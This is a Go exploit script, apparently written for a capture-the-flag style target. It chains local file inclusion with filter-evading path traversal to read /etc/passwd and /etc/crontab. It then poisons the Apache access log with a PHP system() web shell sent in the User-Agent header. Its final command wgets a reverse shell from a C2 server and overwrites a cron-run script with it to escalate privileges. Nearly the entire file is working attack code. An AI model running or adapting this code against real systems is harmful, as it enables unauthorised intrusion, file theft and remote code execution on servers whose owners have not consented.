package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"time"
)

const EnableVirtualTerminalProcessing uint32 = 0x4

var ANSI_SET bool = false

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL    string
	Parameters []ParamStruct
	Route      string
	Session    *http.Client
}

type CookieJar struct {
	jar map[string][]*http.Cookie
}

type ParamStruct struct {
	name    string
	baseval string
}

// ============================================================
//
// Function Name: GetBodyContent
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take make a GET request to a target
//  route and return the body content to the user.
//
// Input(s):
//
//  route - string. route to make GET request on.
//
// Return(s):
//
//  bodycontent - []byte. content pulled from target URL.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GetBodyContent(route string) (bodycontent []byte, err error) {
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return bodycontent, nil
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TestConnection() (success bool, message string) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "client connection successful"
}

//============================================================
//
// Function Name: GrabParams
//
// Author: Thomas Osgood
//
// Description:
//
//  This function is designed to grab the parameters taken by
//  the target route.
//
// Input(s):
//
//  route - string. route to webpage.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func (c *Client) GrabParams(route string) (success bool, message string) {
	var bodycontent []byte
	var err error
	var params ParamStruct
	var paramfull string
	var paramsplit []string
	var matches [][]byte
	var re *regexp.Regexp
	var tgtpattern string = fmt.Sprintf(`%s\?.*"><`, route)

	bodycontent, err = c.GetBodyContent(route)
	if err != nil {
		return false, err.Error()
	}

	re, err = regexp.Compile(tgtpattern)
	if err != nil {
		return false, err.Error()
	}

	matches = re.FindAll(bodycontent, -1)
	if len(matches) < 1 {
		return false, "no params found"
	}

	paramfull = strings.Split(string(matches[0]), "?")[1]

	paramsplit = strings.Split(paramfull, "=")
	params.name = paramsplit[0]

	paramsplit = strings.Split(paramsplit[1], "/")
	params.baseval = strings.Join(paramsplit[:len(paramsplit)-1], "/")

	c.Parameters = append(c.Parameters, params)

	return true, "parameters successfully pulled"
}

//============================================================
//
// Function Name: ConductLFI
//
// Author: Thomas Osgood
//
// Description:
//
//  This function is designed to conduct an LFI attack against
//  the target machine and return the file content.
//
// Input(s):
//
//  tgtroute - string. route to webpage.
//  tgtfile - string. file to get content of.
//
// Return(s):
//
//  filecontent - []byte. content of target file.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func (c *Client) ConductLFI(tgtroute string, tgtfile string) (filecontent []byte, success bool, message string) {
	var dirwalk string
	var err error
	var query url.Values = url.Values{}
	var req *http.Request
	var resp *http.Response
	var tgtfilepath string
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, tgtroute)
	const walkstr string = "../"

	//============================================================
	// Build directory walking string.
	//============================================================
	for i := 0; i < 10; i++ {
		dirwalk = fmt.Sprintf("%s%s", dirwalk, walkstr)
	}

	//============================================================
	// Manipulate directory walk to evade filters.
	//============================================================
	dirwalk = c.EvadeFilter(dirwalk)

	tgtfilepath = fmt.Sprintf("%s/%s%s", c.Parameters[0].baseval, dirwalk, tgtfile)

	req, err = http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return nil, false, err.Error()
	}

	query.Add(c.Parameters[0].name, tgtfilepath)
	req.URL.RawQuery = query.Encode()

	SysMsgNB("conducting LFI")
	resp, err = c.Session.Do(req)
	if err != nil {
		return nil, false, err.Error()
	}
	defer resp.Body.Close()

	filecontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, false, err.Error()
	}

	//============================================================
	// Grab only the file contents.
	//============================================================
	filecontent = []byte(strings.TrimSpace(strings.Split(strings.Split(string(filecontent), "br>")[1], "</div>")[0]))

	return filecontent, true, "LFI conducted"
}

//============================================================
//
// Function Name: ConfirmLFI
//
// Author: Thomas Osgood
//
// Description:
//
//  This function is designed to confiem the existance of
//  Local File Inclusion (LFI) on the target device. To do
//  this, it checks to see if it can access "/etc/passwd". If
//  it does not detect the presence of an "/etc/passwd" root
//  line it returns false, indicating it could not confirm LFI.
//
// Input(s):
//
//  tgtroute - string. route to webpage.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func (c *Client) ConfirmLFI(tgtroute string) (success bool, message string) {
	var content []byte
	var err error
	var re *regexp.Regexp
	const tgtpattern string = "root:x:0:0:root:.*"

	content, success, message = c.ConductLFI(tgtroute, "etc/passwd")
	if !success {
		return false, message
	}

	InfMsg(fmt.Sprintf("%s", string(content)))

	re, err = regexp.Compile(tgtpattern)
	if err != nil {
		return false, err.Error()
	}

	matches := re.FindAll(content, -1)
	if len(matches) < 1 {
		return false, "cannot confirm LFI."
	}

	return true, "LFI confirmed"
}

//============================================================
//
// Function Name: EvadeFilter
//
// Author: Thomas Osgood
//
// Description:
//
//  This function is designed to manipulate a filepath so it
//  will evade the path filter on the target machine.
//
// Input(s):
//
//  filepath - string. path to manipulate.
//
// Return(s):
//
//  manipulated - string. filter-evading file path.
//
//============================================================
func (c *Client) EvadeFilter(filepath string) (manipulated string) {
	manipulated = filepath

	//============================================================
	// Manipulate directory walk to evade filters.
	//============================================================
	for {
		if strings.Contains(manipulated, "../..") {
			manipulated = strings.Replace(manipulated, "../..", "..//..", -1)
		} else {
			break
		}
	}

	return manipulated
}

//============================================================
//
// Function Name: PoisonLog
//
// Author: Thomas Osgood
//
// Description:
//
//  This function is designed to poison the access log file
//  on the target.  This poisoning is done by injecting a
//  GET parameter in the request's User-Agent header. When the
//  attacker places a command in this new URL query parameter,
//  the command gets executed by the target.
//
// Input(s):
//
//  targetpath - string. path to webpage.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func (c *Client) PoisonLog(targetpath string) (success bool, message string) {
	var phpstring string = "<?php system($_GET['c']); ?>"
	var query url.Values = url.Values{}
	var resp *http.Response
	var route string = c.EvadeFilter("../../../../../../../../../../../var/log/apache2/access.log")
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, targetpath)

	SysMsgNB("attempting to poison log")
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return false, err.Error()
	}

	route = fmt.Sprintf("%s/%s", c.Parameters[0].baseval, route)

	query.Add(c.Parameters[0].name, route)
	req.URL.RawQuery = query.Encode()

	req.Header.Set("User-Agent", phpstring)

	resp, err = c.Session.Do(req)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return false, fmt.Sprintf("Bad Status Code (%s)", resp.Status)
	}

	return true, "log successfully poisoned"
}

//============================================================
//
// Function Name: ExecCommand
//
// Author: Thomas Osgood
//
// Description:
//
//  This function is designed to poison the access log file
//  and execute arbitraty commands on the target machine. To
//  do this, the log is poisoned via the User-Agent header,
//  then the command is executed via a URL query parameter.
//
// Input(s):
//
//  targetpath - string. path to webpage.
//  cmd - string. command to execute on target.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func (c *Client) ExecCommand(targetpath string, cmd string) (success bool, message string) {
	var query url.Values = url.Values{}
	var resp *http.Response
	var route string = c.EvadeFilter("../../../../../../../../../../../var/log/apache2/access.log")
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, targetpath)

	//============================================================
	// Poison access log to gain RCE
	//============================================================
	success, message = c.PoisonLog(targetpath)
	if !success {
		return false, message
	}
	SucMsg(message)

	//============================================================
	// Attempt RCE by placing command in parameter
	//============================================================
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return false, err.Error()
	}

	route = fmt.Sprintf("%s/%s", c.Parameters[0].baseval, route)

	query.Set(c.Parameters[0].name, route)
	query.Set("c", cmd)
	req.URL.RawQuery = query.Encode()

	SysMsgNB("executing command")
	resp, err = c.Session.Do(req)
	if err != nil {
		if e, ok := err.(net.Error); ok && e.Timeout() {
			return true, "timeout encountered. assume shell running."
		}
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "command successfully executed"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, success bool, message string) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", false, err.Error()
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", false, "no match found"
	}

	match = string(matches[0])

	return match, true, "match found"
}

func init() {
	return
}

func main() {
	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool

	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second}, Parameters: []ParamStruct{}}

	var c2ip string
	var c2port int
	var c2address string

	var revshell string

	var content []byte
	var success bool
	var message string

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.StringVar(&c2ip, "c2ip", "127.0.0.1", "IP or Domain of C2 server hosting reverse shell")
	flag.IntVar(&c2port, "c2port", 9999, "port the C2 server is hosting content on")
	flag.StringVar(&revshell, "r", "revshell", "name of reverse shell file to download from C2")
	flag.Parse()

	success, message = ValidatePort(port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	success, message = ValidatePort(c2port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	c2address = fmt.Sprintf("http://%s:%d", c2ip, c2port)

	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))
	InfMsg(fmt.Sprintf("C2 Server: %s", c2address))
	InfMsg(fmt.Sprintf("RevShell: %s", revshell))
	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	client.baseURL = baseURL

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	success, message = client.TestConnection()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = client.GrabParams("test.php")
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	success, message = client.ConfirmLFI("test.php")
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	content, success, message = client.ConductLFI("test.php", "etc/passwd")
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	InfMsg(fmt.Sprintf("\n%s", string(content)))

	content, success, message = client.ConductLFI("test.php", "etc/crontab")
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	InfMsg(fmt.Sprintf("\n%s", string(content)))

	//============================================================
	// Upload a reverse shell on target machine and horizontally
	// escalate privileges via a cron job.
	//============================================================
	success, message = client.ExecCommand("test.php", fmt.Sprintf("wget -O /tmp/rev %s/%s;chmod +x /tmp/rev;cp /tmp/rev /opt/helloworld.sh", c2address, revshell))
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	return
}

